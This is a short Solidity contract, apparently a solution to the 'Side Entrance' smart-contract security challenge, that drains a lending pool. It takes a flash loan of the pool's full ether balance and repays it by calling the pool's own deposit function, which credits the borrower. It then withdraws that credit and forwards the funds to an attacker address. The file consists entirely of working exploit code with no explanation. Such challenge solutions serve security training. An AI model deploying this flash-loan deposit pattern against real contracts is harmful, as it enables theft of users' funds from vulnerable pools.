// SPDX-License-Identifier: MIT

import "./SideEntranceLenderPool.sol";

pragma solidity ^0.8.0;

contract SideEntranceLenderPoolExploit is IFlashLoanEtherReceiver {
    SideEntranceLenderPool private immutable pool;

    constructor(address _pool) {
        pool = SideEntranceLenderPool(_pool);
    }

    function exploit(address _attacker) external {
        uint256 fundsToDrain = address(pool).balance;

        pool.flashLoan(fundsToDrain);
        pool.withdraw();
        payable(_attacker).call{value: fundsToDrain}("");
    }

    function execute() external payable {
        pool.deposit{value: address(this).balance}();
    }

    receive() external payable {}
}
